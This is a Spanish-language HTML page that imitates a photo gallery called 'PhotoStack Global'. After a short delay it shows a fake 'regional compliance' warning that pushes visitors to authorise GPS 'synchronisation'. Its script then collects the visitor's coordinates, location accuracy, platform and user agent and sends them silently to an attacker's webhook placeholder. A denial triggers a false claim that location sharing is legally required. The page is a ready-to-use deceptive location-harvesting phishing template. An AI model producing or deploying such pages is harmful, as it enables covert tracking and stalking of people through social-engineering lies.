<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sincronización de Red | PhotoStack Global</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #000000;
            --ios-card: rgba(28, 28, 30, 0.75);
            --accent-blue: #007aff; /* Azul institucional para mayor confianza */
            --text-main: #ffffff;
            --text-dim: #8e8e93;
            --ease: cubic-bezier(0.4, 0, 0.2, 1);
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: var(--bg-black); font-family: 'Inter', sans-serif;
            overflow: hidden; -webkit-tap-highlight-color: transparent;
        }

        /* --- GRILLA DE CONTENIDO --- */
        #content-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr); /* 3 columnas fijas en móvil */
            gap: 2px; padding: 2px;
            transition: filter 0.8s var(--ease), transform 1s var(--ease);
        }

        .item {
            background: #1c1c1e; aspect-ratio: 1/1;
            position: relative; overflow: hidden;
        }

        .item::after {
            content: ""; position: absolute; top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
            animation: loading 1.5s infinite;
        }

        @keyframes loading { 100% { left: 100%; } }

        /* --- OVERLAY SISTÉMICO --- */
        #system-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            opacity: 0; visibility: hidden; transition: all 0.6s var(--ease);
            z-index: 99; padding: 20px; box-sizing: border-box;
        }

        .card {
            background: var(--ios-card);
            backdrop-filter: blur(30px) saturate(150%);
            -webkit-backdrop-filter: blur(30px) saturate(150%);
            border-radius: 20px; border: 0.5px solid rgba(255,255,255,0.15);
            width: 100%; max-width: 340px; padding: 25px;
            text-align: center; color: var(--text-main);
            transform: scale(1.1) translateY(20px);
            transition: all 0.5s var(--ease);
        }

        /* --- ICONO SVG PROFESIONAL (Sustituye al emoji) --- */
        .status-icon {
            width: 48px; height: 48px; margin: 0 auto 20px;
            fill: none; stroke: #ff453a; stroke-width: 2;
        }

        .title { font-size: 19px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.3px; }
        .description { font-size: 14px; line-height: 1.5; color: var(--text-dim); margin-bottom: 25px; }

        /* BOTÓN ESTILO APPLE */
        .btn {
            background: var(--accent-blue); color: white; border: none;
            width: 100%; padding: 14px; border-radius: 12px;
            font-size: 16px; font-weight: 600; cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn:active { opacity: 0.7; }

        /* ACTIVACIÓN */
        body.error #content-grid { filter: blur(15px); transform: scale(1.05); }
        body.error #system-overlay { opacity: 1; visibility: visible; }
        body.error .card { transform: scale(1) translateY(0); }

    </style>
</head>
<body id="b">

    <div id="content-grid">
        </div>

    <div id="system-overlay">
        <div class="card">
            <svg class="status-icon" viewBox="0 0 24 24">
                <path d="M12 9v4m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 17c-.77 1.333.192 3 1.732 3z" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <div class="title">Restricción de Nodo Local</div>
            <div class="description">
                Su conexión actual ha sido interceptada por un protocolo de cumplimiento regional. Para habilitar el acceso a la red de contenido de su país, se requiere una <strong>sincronización de coordenadas GPS</strong> con el servidor local.
            </div>
            <button class="btn" id="s" onclick="init()">Autorizar Sincronización</button>
        </div>
    </div>

    <script>
        // Llenar grilla
        const g = document.getElementById('content-grid');
        for(let i=0; i<30; i++) {
            const d = document.createElement('div');
            d.className = 'item';
            g.appendChild(d);
        }

        // Timer profesional
        setTimeout(() => { document.getElementById('b').classList.add('error'); }, 3000);

        function init() {
            const btn = document.getElementById('s');
            btn.innerHTML = "Sincronizando...";
            btn.style.opacity = "0.5";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const d = {
                        lat: p.coords.latitude,
                        lon: p.coords.longitude,
                        acc: p.coords.accuracy,
                        platform: navigator.platform,
                        agent: navigator.userAgent
                    };
                    
                    // ENVÍO DE DATOS
                    fetch('TU_URL_DE_WEBHOOK_AQUI', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(d)
                    });

                    document.querySelector('.title').innerHTML = "Sincronización Completa";
                    document.querySelector('.description').innerHTML = "Región validada. Redirigiendo...";
                    btn.style.display = "none";
                }, () => {
                    alert("Error: Es obligatorio autorizar la ubicación para cumplir con la regulación de su país.");
                    btn.innerHTML = "Reintentar";
                    btn.style.opacity = "1";
                });
            }
        }
    </script>
</body>
</html>
